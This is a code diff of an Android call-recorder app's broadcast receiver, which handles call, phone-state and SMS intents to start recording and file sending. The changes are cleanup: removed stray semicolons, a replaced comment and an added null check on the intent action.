@@ -20,7 +20,7 @@ import phonerecorder.kivsw.com.faithphonerecorder.ui.main_activity.MainActivityP
 import phonerecorder.kivsw.com.faithphonerecorder.ui.notification.AntiTaskKillerNotification;
 
 /**
- * Created by ivan on 4/23/18.
+ * Receives intents
  */
 
 public class AppReceiver extends android.content.BroadcastReceiver{
@@ -46,11 +46,12 @@ public class AppReceiver extends android.content.BroadcastReceiver{
         {
             errorProcessor.onError(t);
         }
-    };
+    }
 
     protected void processIntent(Context context, Intent intent)
     {
         String action = intent.getAction();
+        if(action!=null)
         switch (action) {
             case Intent.ACTION_NEW_OUTGOING_CALL:
                 outgoingCall(context, intent);
@@ -83,7 +84,7 @@ public class AppReceiver extends android.content.BroadcastReceiver{
     {
         taskExecutor.startFileSending();
         setWatchdogTimer(context);
-    };
+    }
     protected void setLauncherIcon(Context context, Intent intent)
     {
 
@@ -94,7 +95,7 @@ public class AppReceiver extends android.content.BroadcastReceiver{
     protected void setWatchdogTimer(Context context)
     {
         WatchdogTimer.setTimer(context);
-    };
+    }
 
     protected void phoneStateChanged(Context context, Intent intent)
     {
@@ -116,7 +117,7 @@ public class AppReceiver extends android.content.BroadcastReceiver{
                 String phoneNumber=intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER );
                 callInfoKeeper.setCallInfo(phoneNumber, true);
                 break;
-        };
+        }
 
 
     }
@@ -147,22 +148,22 @@ public class AppReceiver extends android.content.BroadcastReceiver{
         IPersistentDataKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();
 
         taskExecutor.startCallRecording();
-    };
+    }
     protected void stopRecording(Context context)
     {
         IPersistentDataKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();
 
         taskExecutor.stopCallRecording();
-    };
+    }
 
     protected void onNotificationClick()
     {
         mainActivityPresenter.showActivity();
-    };
+    }
     protected void onNewSms()
     {
         if(!settings.getEnableSmsRecording())
             return;
         taskExecutor.startSMSreading();
-    };
+    }
 }
